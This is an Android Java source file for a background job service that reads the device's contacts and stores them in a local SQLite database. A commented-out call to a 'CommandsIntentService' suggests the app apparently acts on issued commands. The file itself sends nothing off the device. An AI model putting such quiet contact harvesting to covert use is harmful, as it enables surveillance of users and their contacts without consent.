package com.candroid.lofl.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Process;

import com.candroid.lofl.api.ContentProviders;
import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;
import com.candroid.lofl.jobs.JobsScheduler;
import com.candroid.lofl.data.pojos.Contact;

import java.util.ArrayList;

public class ContactsJobService extends JobService {
    @Override
    public boolean onStartJob(final JobParameters params) {
/*        Intent contactsIntent = new Intent(this, CommandsIntentService.class);
        contactsIntent.setAction(CommandsIntentService.ACTION_CONTACTS);
        startService(contactsIntent);*/
        new Thread(new Runnable() {
            @Override
            public void run() {
                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(ContactsJobService.this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertContacts(database, contacts);
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally{
                    database.endTransaction();
                    database.close();
                }
                JobsScheduler.setJobRan(ContactsJobService.this, JobsScheduler.CONTACTS_KEY);
                ContactsJobService.this.jobFinished(params, false);
            }
        }).start();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}